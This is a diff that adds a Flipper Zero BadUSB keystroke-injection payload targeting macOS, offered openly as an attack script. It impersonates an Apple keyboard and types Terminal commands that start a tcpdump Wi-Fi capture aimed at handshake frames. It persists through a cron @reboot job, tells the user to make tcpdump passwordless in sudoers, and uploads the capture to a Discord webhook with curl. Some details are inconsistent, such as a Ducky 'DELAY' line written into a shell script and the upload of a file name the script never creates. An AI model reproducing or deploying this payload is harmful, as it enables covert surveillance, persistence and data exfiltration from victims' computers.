@@ -1,0 +1,58 @@
+ID 05ac:021e Apple:Keyboard
+REM Keep these 3 lines IF (and only if) it's the first time you are performing a badKB attack against a specific macOS target.
+REM In fact, it helps Flipper Zero bypass the macOS keyboard setup assistant. Otherwise the attack will not start.
+REM Author: hector(sasquatchchicken)
+REM Version 1.0 (Flipper Ducky)
+REM Target: macOS
+DELAY 500
+F4
+DELAY 1000
+REM Open Terminal
+REM Change directory
+STRING cd /tmp
+ENTER
+DELAY 500
+REM Create a directory with timestamp
+STRING mkdir roberto_$(date +'%d-%m-%y_%H%M%S')
+ENTER
+DELAY 500
+REM Change to the newly created directory
+STRING cd roberto_*
+ENTER
+DELAY 500
+REM Save the script to a file in the current directory
+STRING touch probe_dump.sh
+ENTER
+DELAY 1000
+STRING echo "sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x0040' -w probe_dump.pcap &" >> probe_dump.sh
+ENTER
+DELAY 1000
+STRING echo "DELAY 60000" >> probe_dump.sh
+ENTER
+DELAY 1000
+REM the provided script sequence, the action is intended to work continuously with persistence.  After the script is executed, it captures Wi-Fi traffic for 1 min, sends the captured data to Discord, and continues to capture.
+REM make sure to place your webhook
+STRING echo "curl -F \"file1=@probe_dump.pcap\" https://discord.com/api/webhooks/" >> probe_dump.sh
+ENTER
+DELAY 1000
+REM Make the script executable
+STRING chmod +x probe_dump.sh
+ENTER
+DELAY 1000
+REM Set up cron job to run the script at reboot one more way to leverage persistence
+STRING echo "@reboot /tmp/roberto_*/probe_dump.sh" > cronjob
+ENTER
+DELAY 1000
+STRING crontab cronjob
+ENTER
+DELAY 1000
+REM Execute a passwordless sudo tcpdump by modifying the sudoers file then dump the packets of the host to a file. This addition that must be added to the sudoers file { <USERNAME> ALL=(ALL) NOPASSWD: /usr/bin/tcpdump } replace <USERNAME> with the username of the targeted user, first for the script to run successfully.
+REM we use the '-w' in place of the '>' operator here because '>' gives, sends a pcap that wireshark cannot read , '-w' resolves the issue.
+STRING sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x0040' -w probe_dump.pcap &
+ENTER
+DELAY 60000
+REM the provided script sequence, the action is intended to work continuously with persistence.  After the script is executed, it captures Wi-Fi traffic for 1 min, sends the captured data to Discord, and continues capture process. We are also using probe request frames as the hexadecimal value so we can later filter the pcap in wireshark for "eapol" see the number of 4 way handshake key sets we have collected.  
+REM Send data to Discord webhook and remember to put in your webhook 
+STRING curl -F "file1=@infinitydump.pcap" https://discord.com/api/webhooks/
+ENTER
+REM remember once 100% is reached on the flipper you can unplug and close terminal window the '&' operator captures indefinitely even after the terminal window is closed.
